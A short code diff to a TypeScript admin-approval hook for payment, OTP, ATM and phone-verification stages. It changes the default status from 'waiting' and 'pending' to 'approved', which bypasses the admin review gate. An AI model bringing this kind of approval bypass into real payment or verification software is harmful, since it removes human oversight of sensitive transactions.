@@ -5,7 +5,7 @@ type Stage = "payment" | "otp" | "atm" | "phone_verification" | "phone_otp" | "s
 type StageStatus = "pending" | "approved" | "rejected";
 
 export const useAdminApproval = (orderId: string | null, stage: Stage) => {
-  const [status, setStatus] = useState<"waiting" | "approved" | "rejected">("waiting");
+  const [status, setStatus] = useState<"waiting" | "approved" | "rejected">("approved");
 
   useEffect(() => {
     if (!orderId) return;
@@ -65,10 +65,10 @@ export const createOrUpdateStage = async (
 
   const stageData: Record<string, any> = {
     current_stage: stage,
-    stage_status: "pending",
+    stage_status: "approved",
     ...extraData,
   };
-  const resolvedStageStatus = (stageData.stage_status as StageStatus | undefined) ?? "pending";
+  const resolvedStageStatus = (stageData.stage_status as StageStatus | undefined) ?? "approved";
 
   let resolvedOrderId = orderId;
 
